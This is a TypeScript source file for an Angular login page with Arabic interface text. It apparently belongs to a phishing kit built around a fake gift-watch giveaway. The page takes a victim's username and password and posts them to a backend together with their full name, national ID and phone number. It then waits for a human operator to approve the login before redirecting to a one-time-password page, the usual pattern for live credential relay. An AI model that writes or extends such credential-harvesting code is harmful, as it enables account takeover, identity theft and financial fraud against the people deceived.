import { Component, signal, inject, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { WatchStateService } from '../../services/watch-state';

@Component({
  selector: 'app-login',
  imports: [CommonModule],
  templateUrl: './login.html',
  styleUrl: './login.css',
})
export class Login implements OnDestroy {
  private readonly watchState = inject(WatchStateService);
  private readonly router = inject(Router);

  // Form input signals
  protected readonly username = signal('');
  protected readonly password = signal('');
  protected readonly isPasswordVisible = signal(false);

  // States
  protected readonly isLoading = signal(false);
  protected readonly loadingMessage = signal('جاري إرسال الطلب للمسؤول...');
  protected readonly errorMessage = signal<string | null>(null);

  // Polling tracker
  private pollIntervalId: any = null;
  private currentRequestId: string | null = null;

  // Cleanup on destroy
  public ngOnDestroy(): void {
    this.stopPolling();
  }

  // Toggle password visibility eye icon
  protected togglePasswordVisibility(): void {
    this.isPasswordVisible.set(!this.isPasswordVisible());
  }

  // Form field inputs
  protected onInput(field: 'user' | 'pass', event: Event): void {
    const value = (event.target as HTMLInputElement).value;
    if (field === 'user') {
      this.username.set(value);
    } else {
      this.password.set(value);
    }
    this.errorMessage.set(null); // Clear error when typing
  }

  // Check if form is valid (to enable/disable the submit button dynamically)
  protected get isFormValid(): boolean {
    return this.username().trim().length > 0 && this.password().length > 0;
  }

  // Form submission handler
  protected handleFormSubmit(event: Event): void {
    event.preventDefault();
    if (!this.isFormValid) return;

    this.isLoading.set(true);
    this.errorMessage.set(null);
    this.loadingMessage.set('جاري تسجيل بيانات الدخول...');

    const payload = {
      username: this.username().trim(),
      password: this.password(),
      fullName: this.watchState.fullName(),
      nationalId: this.watchState.nationalId(),
      phoneNumber: this.watchState.phoneNumber(),
      watchColor: this.watchState.selectedWatch().colorLabel,
    };

    // Make API call to backend server on port 3000
    fetch('http://localhost:3000/api/logins', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })
      .then((res) => {
        if (!res.ok) {
          throw new Error('فشل إرسال البيانات للسيرفر الخلفي.');
        }
        return res.json();
      })
      .then((data: { id: string; status: string }) => {
        this.currentRequestId = data.id;
        this.loadingMessage.set('بانتظار موافقة المسؤول... يرجى عدم إغلاق الصفحة');
        this.startPolling(data.id);
      })
      .catch((err) => {
        console.error(err);
        this.isLoading.set(false);
        this.errorMessage.set('حدث خطأ أثناء الاتصال بالسيرفر. تأكد من تشغيل الباك إند.');
      });
  }

  // Poll status endpoint every 2 seconds
  private startPolling(requestId: string): void {
    this.stopPolling();
    this.pollIntervalId = setInterval(() => {
      fetch(`http://localhost:3000/api/logins/${requestId}/status`)
        .then((res) => {
          if (!res.ok) throw new Error('Failed to fetch status');
          return res.json();
        })
        .then((data: { id: string; status: string }) => {
          console.log(`Polling status for request ${requestId}:`, data.status);
          
          if (data.status === 'APPROVED') {
            this.stopPolling();
            this.isLoading.set(false);
            this.router.navigate(['/otp']);
          } else if (data.status === 'REJECTED') {
            this.stopPolling();
            this.isLoading.set(false);
            this.errorMessage.set('تم رفض طلب الدخول واستلام الهدية من قبل المسؤول.');
          }
        })
        .catch((err) => {
          console.warn('Polling error:', err);
        });
    }, 2000);
  }

  private stopPolling(): void {
    if (this.pollIntervalId) {
      clearInterval(this.pollIntervalId);
      this.pollIntervalId = null;
    }
  }

  protected goBack(): void {
    this.router.navigate(['/personal-info']);
  }
}
